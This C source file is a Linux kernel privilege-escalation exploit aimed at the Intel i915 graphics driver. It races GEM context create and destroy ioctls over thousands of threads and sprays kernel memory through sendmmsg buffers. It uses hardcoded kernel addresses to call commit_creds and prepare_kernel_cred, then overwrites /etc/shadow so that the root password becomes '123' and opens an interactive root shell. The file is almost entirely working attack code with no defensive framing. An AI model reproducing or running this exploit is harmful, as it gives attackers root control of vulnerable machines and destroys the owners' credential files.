#define _GNU_SOURCE         /* See feature_test_macros(7) */
#include <sys/socket.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <stdio.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <sys/types.h>
#include <stdint.h>
#include <netinet/ip.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <limits.h>
#include <sys/mman.h>

#include <linux/fs.h>
 


#include <stdbool.h>
//#include <sys/sysinfo.h>
#define UDP_SERVER_PORT (5105)
#define MEMMAGIC (0xDEADBEEF)
//pipe buffers are seperated in pages
#define PIPESZ (4096 * 32)
#define IOVECS (512)
#define SENDTHREADS (1)

static volatile int kill_switch = 0;
static volatile int stop_send = 0;
static struct iovec iovs[IOVECS];
static volatile unsigned long overflowcheck = MEMMAGIC;
#define ADDRESS (0xffff8803a0000000)


#define THREAD_NUM 10000
#define SEND_THREAD 1
#define LOOP_NUM 1000
#define SOCK_SPRAY_THREADS      100
typedef uint32_t __u32;
//typedef  uint64_t __u64;
struct drm_i915_gem_context_create {
        /*  output: id of new context*/
        __u32 ctx_id;
        __u32 pad;
};

struct drm_i915_gem_context_destroy {
        __u32 ctx_id;
        __u32 pad;
};


struct drm_i915_gem_context_param {
        __u32 ctx_id;
        __u32 size; 
        __u64 param;
#define I915_CONTEXT_PARAM_BAN_PERIOD   0x1
#define I915_CONTEXT_PARAM_NO_ZEROMAP   0x2
#define I915_CONTEXT_PARAM_GTT_SIZE     0x3
#define I915_CONTEXT_PARAM_NO_ERROR_CAPTURE     0x4
#define I915_CONTEXT_PARAM_BANNABLE     0x5
#define I915_CONTEXT_PARAM_PRIORITY     0x6
#define   I915_CONTEXT_MAX_USER_PRIORITY        1023 /* inclusive */
#define   I915_CONTEXT_DEFAULT_PRIORITY         0
#define   I915_CONTEXT_MIN_USER_PRIORITY        -1023 /* inclusive */
        __u64 value;
};


#define DRM_COMMAND_BASE                0x40
#define DRM_I915_GEM_CONTEXT_CREATE     0x2d
#define DRM_I915_GEM_CONTEXT_DESTROY    0x2e
#define DRM_I915_GEM_CONTEXT_SETPARAM   0x35

#define DRM_IOCTL_BASE                  'd'

#define DRM_IOW(nr,type)                _IOW(DRM_IOCTL_BASE,nr,type)
#define DRM_IOWR(nr,type)               _IOWR(DRM_IOCTL_BASE,nr,type)

#define DRM_IOCTL_I915_GEM_CONTEXT_CREATE       DRM_IOWR (DRM_COMMAND_BASE + DRM_I915_GEM_CONTEXT_CREATE, struct drm_i915_gem_context_create)
#define DRM_IOCTL_I915_GEM_CONTEXT_DESTROY      DRM_IOW (DRM_COMMAND_BASE + DRM_I915_GEM_CONTEXT_DESTROY, struct drm_i915_gem_context_destroy)
#define DRM_IOCTL_I915_GEM_CONTEXT_SETPARAM     DRM_IOWR (DRM_COMMAND_BASE + DRM_I915_GEM_CONTEXT_SETPARAM, struct drm_i915_gem_context_param)


typedef void* (*fun)(void*);

//int client_id;
//struct snd_seq_port_info info;
int fd;
struct drm_i915_gem_context_create c;
struct drm_i915_gem_context_destroy d;
struct drm_i915_gem_context_param s;

void* thread1(void*);
void* thread2(void*);
void* thread3(void*);
int sockfd;
struct mmsghdr msg = {{ 0 }, 0 };
struct sockaddr_in soaddr = { 0 };

char search_key[] = "default\x00user:number0\x00""3900";



/* constants */
#define BASE10		10		/* base 10 */
#define BASE16		16		/* base 16 */
#define PATH_SZ		32		/* path size (/proc/<pid>/pagemap) */
#define PRESENT_MASK	(1ULL << 63) 	/* get bit 63 from a 64-bit integer */
#define PFN_MASK	((1ULL << 55) - 1)	/* get bits 0-54 from
						   a 64-bit integer */
#define PAGE_OFFSET	0xffff880000000000UL//0xffffea0000000000UL






unsigned long KERNEL_BASE = 	0xffffffff81000000ul;

// Kernel symbol offsets
#define COMMIT_CREDS		0xae0e0ul
#define PREPARE_KERNEL_CRED	0xae4c0ul
#define NATIVE_WRITE_CR4	0x699a0ul
#define MSLEEP                  0x108420ul
#define FILP_OPEN               0x274480ul
#define KERNEL_WRITE               0x277400ul 
#define FILP_CLOSE               0x2726a0ul
typedef unsigned long __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _msleep)(unsigned long cred);
//typedef void __attribute__((regparm(3))) (* _flip_open)(char * path,unsigned long flag,unsigned right);
typedef unsigned long * __attribute__((regparm(3))) (* _filp_open)(char * path,unsigned long flag,unsigned right);
typedef unsigned long __attribute__((regparm(3)))  (* _kernel_write)(unsigned long *filp, char * buffer, size_t len, unsigned long *pos); 
typedef unsigned long __attribute__((regparm(3)))  (* _filp_close)(unsigned long *filp, unsigned long a);
static char buf[] ="root:$6$NXXO4q/s$5wk3Zm1v0oAZ1iEa2u.Nmjo4QQ8AMyQlXUIRO41UK4/y50rVfQtzesM6SYAQKhhAbfBB5fbDa8YWBumlBWhwW1:17710:0:99999:7:::\n";
	 static char path[]="/etc/shadow";
void get_root_payload(void) {


	((_commit_creds)(0xffffffff810ae0e0))(
		((_prepare_kernel_cred)(0xffffffff810ae4c0))(0)
	);
	 /*
	unsigned long *fp;
       
        */
        ((_kernel_write)(0xffffffff812773e0))(((_filp_open)(0xffffffff81274480))(ADDRESS+0x600,O_RDWR|O_CREAT,0644),ADDRESS+0x700,123 ,(unsigned long *) ADDRESS+0x800);
        //pos =0;
        
//kernel_write  flip_open
        
        return ;

	
	
	
}


		

#define	SPRAY0_BUF_LEN0 8192
char buf_padding[SPRAY0_BUF_LEN0];


void init_buf_padding(void)
{
	
	long		psize;		/* page size		*/
	pid_t		pid	= -1;	/* pid			*/
	unsigned long	vaddr	= 0;	/* virtual address	*/

	/* getopt stuff */
	int		opt;		/* option		*/
	int 	long_opt_indx	= 0;	/* long option index	*/

	/* long options */
	
	
	/* get the page size */
	if ((psize = sysconf(_SC_PAGESIZE)) == -1)
		printf( "failed while trying to read page size -- %s",
				strerror(errno));
	
	

	pid=getpid();

vaddr=(unsigned long)mmap(NULL,
                psize*1024*500,
                PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE /* important */,
-1, 0);
	
	 if (mlock((void *)vaddr, psize) == -1) {
                printf("[-] failed to lock memory (%s), aborting!\n",
                        strerror(errno));
                }
	for(int i=0;i<psize*1024*500;i+=psize){
		memset((void *)(vaddr+i),0,psize);
		*((uint64_t*) (vaddr+i+0x2f0))=ADDRESS+0x1f0;//rcx

		
		//*((uint64_t*) (vaddr+i+0x100))=ADDRESS+0x100;//rdi
		 *((uint64_t*) (vaddr+i+0x318))=0x0;
		*((uint64_t*) (vaddr+i+0x218))=0x0;
		 *((uint64_t*) (vaddr+i+0x320))=ADDRESS+0x320;
		*((uint64_t*) (vaddr+i+0x220))=ADDRESS+0x220;
		*((uint64_t*) (vaddr+i+0x310))=ADDRESS+0x310;
		*((uint64_t*) (vaddr+i+0x210))=ADDRESS+0x210;
		
		*((uint64_t*) (vaddr+i+0x100))=0;
		 *((uint64_t*) (vaddr+i+0x200))=0;

		*((uint64_t *)(vaddr+i+0x1f8))=0x0;
		*((uint64_t *)(vaddr+i+0x0f8))=0x0;
		*((char *)vaddr+i+0x98)=0x1;
		*((char *)vaddr+i+0x198)=0x1;

		*((uint64_t *)(vaddr+i+0x1a8))=ADDRESS;
		*((uint64_t *)(vaddr+i+0xa8))=ADDRESS;
		
		*((uint64_t *)(vaddr+i+0x368))=0x0;
		

		
		//*((uint64_t *)(vaddr+i+0x100))=0x04;
		//*((uint64_t *)(vaddr+i+0x104))=0x2000;
		//*((uint64_t *)(vaddr+i+0x108))=0x2000;
		//*((uint64_t *)(vaddr+i+0x10b))=0x2000;
		//*((uint64_t *)(vaddr+i+0x130))=0x0000003fffffffff;
		//*((uint64_t *)(vaddr+i+0x138))=0x0000003fffffffff;
		//*((uint64_t *)(vaddr+i+0x140))=0x0000003fffffffff;

		 //*((uint64_t *)(vaddr+i+0x180))=0xffffffff824536a0;
		//*((uint64_t *)(vaddr+i+0x188))=0xffffffff82453740;

		//*((uint64_t *)(vaddr+i+0x190))=0xffffffff8245aac8;
		

		//*((uint64_t *)(vaddr+i+0x128))=0x606f0;
		//*((uint64_t *)(vaddr+i+0x120))=KERNEL_BASE+NATIVE_WRITE_CR4;
		
		*((uint64_t *)(vaddr+i+0x128))=ADDRESS;
		*((uint64_t *)(vaddr+i+0x120))=0xffffffff810761a0;//set_memory_x

		memcpy((uint64_t *)(vaddr+i+0x500),&get_root_payload,0x80);
		memcpy((char *)(vaddr+i+0x600),path,sizeof(path));
		memcpy((char *)(vaddr+i+0x700),buf,sizeof(buf));
		*((uint64_t *)(vaddr+i+0x800))=0;
		*((uint64_t *)(vaddr+i+0x488))=0xffffffff810a2bc0;//work_for_cpu_fn
		*((uint64_t *)(vaddr+i+0x4a0))=ADDRESS+0x500;//(uint64_t)&get_root_payload;//0xffffffff810ae0e0;0xffffffff81108420;//(void *)//;//0xffffffff810ade90 ;//0xffffffff81108420;//////;
	//	*((uint64_t*) (vaddr+i+0x320))=ADDRESS+0x2f0;
	//	*((uint64_t*) vaddr+1)=ADDRESS+0x1f0+sizeof(ADDRESS);

               }


	
	/* check if the virtual address is page-aligned */
	if ((vaddr & (psize - 1)) != 0) {
		/* verbose */
	printf("virtual address %#lx is not page-aligned; converting to %#lx",
		vaddr, vaddr & (ULONG_MAX - (psize - 1)));
		/* fix the virtual address */
		vaddr &= ULONG_MAX - (psize - 1);
	}

	memset(buf_padding, 'a',
			SPRAY0_BUF_LEN0);
	*((uint64_t*) buf_padding)=0x4606e0;
	*((uint64_t *)(buf_padding+0x3a0))=ADDRESS+0x2f0; //r14
}

void inc_kernel_heap(void)
{
	
	 cpu_set_t mask;
        CPU_ZERO(&mask);
         CPU_SET(0,&mask);
        if (sched_setaffinity(0, sizeof(mask), &mask) == -1)
         {
                   printf("warning: could not set CPU affinity, continuing...\n");
         }

	init_buf_padding();


}



void exec_shell() {
	char *shell = "/bin/bash";
	char *args[] = {shell, "-i", NULL};
	execve(shell, args, NULL);
}

void fork_shell() {
	pid_t rv;

	rv = fork();
	if (rv == -1) {
		perror("[-] fork()");
		exit(EXIT_FAILURE);
	}

	if (rv == 0) {
		exec_shell();
	}
}

bool is_root() {
	// We can't simple check uid, since we're running inside a namespace
	// with uid set to 0. Try opening /etc/shadow instead.
	int fd = open("/etc/shadow", O_RDONLY);
	if (fd == -1)
		return false;
	close(fd);
	return true;
}
#include <stdarg.h>

static bool write_file(const char* file, const char* what, ...)
{
	char buf[1024];
	va_list args;
	va_start(args, what);
	vsnprintf(buf, sizeof(buf), what, args);
	va_end(args);
	buf[sizeof(buf) - 1] = 0;
	int len = strlen(buf);

	int fd = open(file, O_WRONLY | O_CLOEXEC);
	if (fd == -1)
		return false;
	if (write(fd, buf, len) != len) {
		close(fd);
		return false;
	}
	close(fd);
	return true;
}


void setup_sandbox() {
	int real_uid = getuid();
	int real_gid = getgid();

        if (unshare(CLONE_NEWUSER) != 0) {
		perror("unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}

        if (unshare(CLONE_NEWNET) != 0) {
		perror("unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}

	if (!write_file("/proc/self/setgroups", "deny")) {
		perror("write_file(/proc/self/set_groups)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)){
		perror("write_file(/proc/self/uid_map)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
		perror("write_file(/proc/self/gid_map)");
		exit(EXIT_FAILURE);
	}

	

	printf("[.] namespace sandbox setup successfully\n");
}


        
int stop=0;
int main(){
		
	//printf("pid is %d \n",getpid());
	printf("[*]This is a linux exploit.\n");
	printf("[*]wait for a while........\n");
	//setup_sandbox();
	inc_kernel_heap();
	
	
       
	
	fd=open("/dev/dri/card0",O_RDWR);
        if(fd<0){
                perror("open");
                return -1;
        }

        int pversion;
        if(ioctl(fd,DRM_IOCTL_I915_GEM_CONTEXT_CREATE,&c)<0){
                perror("CREATE");
                return -1;
        }else
                //printf("create ctx_id is %d\r\n",c.ctx_id);
	s.ctx_id=c.ctx_id;
	s.size=0;
	s.param=I915_CONTEXT_PARAM_PRIORITY;
	s.value=0;

	if(ioctl(fd,DRM_IOCTL_I915_GEM_CONTEXT_SETPARAM,&s)<0){
		perror("SETPARAM");
	//	return -1;
	}

	int i=0;
	sockfd = socket(AF_INET, SOCK_DGRAM, 0);


	msg.msg_hdr.msg_iov = iovs;
	msg.msg_hdr.msg_iovlen = IOVECS;
	msg.msg_hdr.msg_control = buf_padding;
	msg.msg_hdr.msg_controllen = 5520;//(IOVECS * sizeof(struct iovec));

	d.ctx_id=c.ctx_id;
  
       pthread_t tid1,tid2,tid3[THREAD_NUM],tid[THREAD_NUM];

        if(pthread_create(&tid1,NULL,thread1,NULL)){
                perror("thread_create");
        }

	for(i=0;i<THREAD_NUM;i++){
              pthread_create(&tid[i],NULL,thread2,NULL);
        }

	
	while(0){

        //if(geteuid==0)
          //   

        //system("/bin/bash -c id");

		if(is_root()){
			printf("getuid is %d.geteuid is %d\n",getuid(),geteuid());
			stop=1;	
			break;
			}
		sleep(3);
        }
	sleep(10);
	 
	stop=1;
	//setuid(2000);
	
	 

        pthread_cancel(tid1);
         for(i=0;i<THREAD_NUM;i ++){
              pthread_cancel(tid[i]);
        }
	for(i=0;i<SEND_THREAD;i ++){
                pthread_cancel(tid3[i]);
        }
	close(sockfd);
	close(fd);
	printf("[+]root password has been changed to  123 ,enjoy^_^ \n");
	fork_shell();
        return 1;
}  
     
void* thread1(void *arg){

        int i=0;
	while(!stop){
		syscall(__NR_sendmmsg, sockfd, &msg, 1, 0);
                if(ioctl(fd,DRM_IOCTL_I915_GEM_CONTEXT_CREATE,&c)>=0)
//			printf("[C] id is %d\r\n",c.ctx_id);
			syscall(__NR_sendmmsg, sockfd, &msg, 1, 0);
		//printf("getuid is %d.geteuid is %d\n",getuid(),geteuid());
		i++;
                
        
       }
        //fork_shell();
        
        pthread_exit(0);
        }

void* thread2(void *arg){


	int i=0,j=0;
        while(!stop){
		
		d.ctx_id=c.ctx_id;
		syscall(__NR_sendmmsg, sockfd, &msg, 1, 0);
                if(ioctl(fd,DRM_IOCTL_I915_GEM_CONTEXT_DESTROY,&d)>=0)
//			printf("[D] id is %d \r\n",d.ctx_id);
			syscall(__NR_sendmmsg, sockfd, &msg, 1, 0);
	sleep(1);	
		i++;
        }
        pthread_exit(0);
}

void * thread3(void *arg){


	//while(1){

        //if(geteuid==0)
          printf("getuid is %d.geteuid is %d\n",getuid(),geteuid());
	//	sleep(1);}
	pthread_exit(0);
}
